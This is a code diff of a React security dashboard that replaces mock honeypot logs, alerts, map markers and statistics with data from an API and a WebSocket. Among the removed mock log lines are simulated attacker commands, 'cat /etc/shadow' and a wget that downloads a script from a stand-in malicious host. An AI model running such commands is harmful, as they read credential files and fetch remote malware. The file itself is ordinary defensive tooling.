@@ -1,65 +1,52 @@
 import React, { useEffect, useState } from 'react';
 import { Shield, ShieldAlert, Network, Server, Terminal, Activity, Wifi } from 'lucide-react';
 import axios from 'axios';
-import type { Stats, Alert, FederatedStatus } from '../types';
+import type { Stats, Alert, FederatedStatus, Honeypot, ThreatMap } from '../types';
+import { ThreatTimeline, AttackDistribution, TopTargeted } from './charts';
+import Ticker from './Ticker';
 
 const API_BASE_URL = 'http://localhost:8000/api';
-
-const mockHoneypotLog = [
-  { time: "10:04:12", type: "system", msg: "Connection established from 183.82.1.204" },
-  { time: "10:04:13", type: "input", msg: "root@sec-ssh-01:~# whoami" },
-  { time: "10:04:14", type: "output", msg: "root" },
-  { time: "10:04:15", type: "input", msg: "root@sec-ssh-01:~# cat /etc/shadow" },
-  { time: "10:04:16", type: "ai", msg: "[GEN-AI] Serving synthetic deceptive filesystem..." },
-  { time: "10:04:17", type: "output", msg: "root:*:18113:0:99999:7:::" },
-  { time: "10:04:19", type: "input", msg: "root@sec-ssh-01:~# wget http://evil.cx/malware.sh -O bot.sh" },
-  { time: "10:04:22", type: "soc", msg: "[AUTO-SOC] Threat Signature #9a88c extracted." },
-  { time: "10:04:24", type: "soc", msg: "[AUTO-SOC] Container isolation routine complete." }
-];
-
-const mapMarkers = [
-  { name: "Delhi Node", type: "Gov Sector", coordinates: [77.2090, 28.6139], status: "critical" },
-  { name: "Mumbai Node", type: "Finance", coordinates: [72.8777, 19.0760], status: "safe" },
-  { name: "Bangalore", type: "Tech Hub", coordinates: [77.5946, 12.9716], status: "warning" },
-  { name: "Hyderabad", type: "Grid Control", coordinates: [78.4867, 17.3850], status: "safe" }
-];
+const WS_URL = 'ws://localhost:8000/ws/alerts';
 
 export default function Dashboard() {
   const [stats, setStats] = useState<Stats | null>(null);
   const [alerts, setAlerts] = useState<Alert[]>([]);
-  const [, setNodes] = useState<FederatedStatus[]>([]);
+  const [nodes, setNodes] = useState<FederatedStatus[]>([]);
+  const [honeypots, setHoneypots] = useState<Honeypot[]>([]);
+  const [threatMap, setThreatMap] = useState<ThreatMap | null>(null);
 
   useEffect(() => {
     const fetchData = async () => {
       try {
-        const [statsRes, , nodesRes] = await Promise.all([
+        const [statsRes, alertsRes, nodesRes, honeypotsRes, threatMapRes] = await Promise.all([
           axios.get<Stats>(`${API_BASE_URL}/stats`),
           axios.get<Alert[]>(`${API_BASE_URL}/alerts`),
           axios.get<FederatedStatus[]>(`${API_BASE_URL}/federated/status`),
+          axios.get<Honeypot[]>(`${API_BASE_URL}/honeypots`),
+          axios.get<ThreatMap>(`${API_BASE_URL}/threat-map`),
         ]);
         
-        setStats({
-          ...statsRes.data,
-          total_threats: 14032,
-          critical_count: 8,
-          honeypot_trapped_count: 312,
-          federated_node_count: 4
-        });
-        
-        const mockAlerts: Alert[] = [
-          {id: 8934, severity: 'critical', description: 'Zero-day lateral movement thwarted in Finacle DB'},
-          {id: 8933, severity: 'high', description: 'Mass port sweeping from overseas IP block'},
-          {id: 8932, severity: 'critical', description: 'Ransomware payload execution blocked by Auto-SOC'},
-          {id: 8931, severity: 'medium', description: 'Unauthorized SSH access attempts against Sector 4'}
-        ];
-        
-        setAlerts(mockAlerts);
+        setStats(statsRes.data);
+        setAlerts(alertsRes.data);
         setNodes(nodesRes.data);
+        setHoneypots(honeypotsRes.data);
+        setThreatMap(threatMapRes.data);
+
       } catch (error) {
-        console.error("Error configuration: ", error);
+        console.error("Error fetching initial data: ", error);
       }
     };
     fetchData();
+
+    const ws = new WebSocket(WS_URL);
+    ws.onmessage = (event) => {
+      const newAlert = JSON.parse(event.data);
+      setAlerts(prevAlerts => [newAlert, ...prevAlerts]);
+    };
+
+    return () => {
+      ws.close();
+    };
   }, []);
 
   return (
@@ -87,14 +74,14 @@ export default function Dashboard() {
 
       {/* OVERVIEW STATS: Clean modular cards */}
       <div className="grid grid-cols-1 md:grid-cols-4 gap-6 mb-8">
-        <StatCard title="Total Threats Prevented" value={stats?.total_threats?.toLocaleString() || "0"} icon={<Activity className="w-5 h-5 text-blue-400" />} trend="+12% today" />
-        <StatCard title="Critical Incidents" value={stats?.critical_count?.toLocaleString() || "0"} icon={<ShieldAlert className="w-5 h-5 text-rose-400" />} alert />
-        <StatCard title="Threats in Honeypot" value={stats?.honeypot_trapped_count?.toLocaleString() || "0"} icon={<Server className="w-5 h-5 text-amber-400" />} />
-        <StatCard title="Active Fed Nodes" value={stats?.federated_node_count?.toString() || "0"} icon={<Network className="w-5 h-5 text-emerald-400" />} />
+        <StatCard title="Total Alerts" value={stats?.alerts_total?.toLocaleString() || "0"} icon={<Activity className="w-5 h-5 text-blue-400" />} trend="+12% today" />
+        <StatCard title="Critical Incidents" value={stats?.alerts_critical?.toLocaleString() || "0"} icon={<ShieldAlert className="w-5 h-5 text-rose-400" />} alert />
+        <StatCard title="Honeypots Active" value={stats?.honeypots_active?.toLocaleString() || "0"} icon={<Server className="w-5 h-5 text-amber-400" />} />
+        <StatCard title="Federated Nodes" value={stats?.nodes_online?.toString() || "0"} icon={<Network className="w-5 h-5 text-emerald-400" />} />
       </div>
 
       {/* CORE DASHBOARD: 3-Column Layout */}
-      <div className="grid grid-cols-12 gap-6 h-[580px]">
+      <div className="grid grid-cols-12 gap-6 h-[580px] mb-8">
         
         {/* LEFT COLUMN: Threat Alerts Feed */}
         <div className="col-span-12 xl:col-span-3 flex flex-col bg-[#131A2A] border border-[#1E293B] rounded-2xl overflow-hidden shadow-xl">
@@ -146,15 +133,15 @@ export default function Dashboard() {
               </g>
               
               {/* Map Markers with Connections */}
-              {mapMarkers.map(({ name, type, coordinates, status }) => {
-                const color = status === 'critical' ? '#f43f5e' : status === 'warning' ? '#f59e0b' : '#10b981';
-                const x = (coordinates[0] - 68) * 4.5 + 100;
-                const y = (32 - coordinates[1]) * 4.5 + 50;
+              {threatMap?.nodes.map((node) => {
+                const color = node.status === 'under_attack' ? '#f43f5e' : node.status === 'online' ? '#10b981' : '#f59e0b';
+                const x = (node.location[1] - 68) * 4.5 + 100;
+                const y = (32 - node.location[0]) * 4.5 + 50;
                 
                 return (
-                  <g key={name}>
+                  <g key={node.id}>
                     {/* Pulsing outer ring */}
-                    {status === 'critical' && (
+                    {node.status === 'under_attack' && (
                       <circle cx={x} cy={y} r="15" fill={color} opacity="0.1" style={{ animation: "pulse 2s infinite" }} />
                     )}
                     {/* Connection line to center */}
@@ -162,8 +149,8 @@ export default function Dashboard() {
                     {/* Marker circle */}
                     <circle cx={x} cy={y} r="5" fill={color} stroke="#1e293b" strokeWidth="1.5" />
                     {/* Label */}
-                    <text x={x + 8} y={y - 5} fontSize="10" fontWeight="bold" fill="white" fontFamily="Inter, sans-serif">{name}</text>
-                    <text x={x + 8} y={y + 5} fontSize="9" fill="#94a3b8" fontFamily="Inter, sans-serif">{type}</text>
+                    <text x={x + 8} y={y - 5} fontSize="10" fontWeight="bold" fill="white" fontFamily="Inter, sans-serif">{node.name}</text>
+                    <text x={x + 8} y={y + 5} fontSize="9" fill="#94a3b8" fontFamily="Inter, sans-serif">{node.type}</text>
                   </g>
                 );
               })}
@@ -202,18 +189,7 @@ export default function Dashboard() {
               </div>
               
               <div className="space-y-1">
-                {mockHoneypotLog.map((log, i) => (
-                  <div key={i} className="flex gap-3">
-                    <span className="text-slate-600 shrink-0 select-none">[{log.time}]</span>
-                    <span className={`break-all ${
-                      log.type === 'ai' ? 'text-amber-400' :
-                      log.type === 'soc' ? 'text-emerald-400 font-bold' :
-                      log.type === 'input' ? 'text-white' : 'text-slate-400'
-                    }`}>
-                      {log.msg}
-                    </span>
-                  </div>
-                ))}
+                {honeypots[0]?.commands_run > 0 && <div>...Honeypot log for {honeypots[0].name}...</div>}
                 <div className="flex gap-3 pt-1">
                   <span className="text-slate-600 shrink-0 select-none">[{new Date().toLocaleTimeString('en-US', { hour12: false })}]</span>
                   <span className="text-emerald-500 animate-pulse block w-2 h-4 bg-emerald-500/80"></span>
@@ -223,6 +199,13 @@ export default function Dashboard() {
         </div>
 
       </div>
+
+        <div className="grid grid-cols-12 gap-6 h-[300px] mb-20">
+            <ThreatTimeline alerts={alerts} />
+            <AttackDistribution alerts={alerts} />
+            <TopTargeted alerts={alerts} />
+        </div>
+        <Ticker alerts={alerts} />
     </div>
   );
 }
